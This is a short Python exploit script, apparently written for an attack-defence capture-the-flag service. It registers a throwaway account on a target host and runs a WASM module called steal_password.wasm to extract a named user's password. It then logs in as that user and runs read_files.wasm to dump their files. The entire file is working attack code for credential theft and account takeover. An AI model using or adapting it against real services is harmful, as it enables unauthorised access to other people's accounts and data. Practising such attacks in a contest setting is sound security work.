#!/usr/bin/env python3

import os
import sys
import random
import string

import requests

from raas_lib import RaasApi, Launch


def random_string(length: int = 16) -> str:
    return "".join(random.choices(string.ascii_letters + string.digits, k=length))


def get_wasm_path(filename: str) -> str:
    base_path = os.path.dirname(os.path.abspath(__file__))
    return os.path.join(base_path, "wasm", filename)


def main():
    host = sys.argv[1]
    api = RaasApi(host)
    target_username = sys.argv[2]
    print(f"Sploiting user={target_username} at {host}")

    s1 = requests.Session()
    username = random_string(10)
    password = random_string(10)
    api.login(s1, username, password)

    result = api.execute(
        s1,
        Launch(
            executable=get_wasm_path("steal_password.wasm"),
            args=[target_username],
        ),
    )
    target_password = result.stdout.decode().strip()
    print(f"Got password of {target_username}: {target_password}")

    print("Reading files...")
    s2 = requests.Session()
    api.login(s2, target_username, target_password)
    result = api.execute(
        s2,
        Launch(
            executable=get_wasm_path("read_files.wasm"),
            args=[],
        ),
    )
    print(result.stdout.decode().strip())


if __name__ == "__main__":
    main()
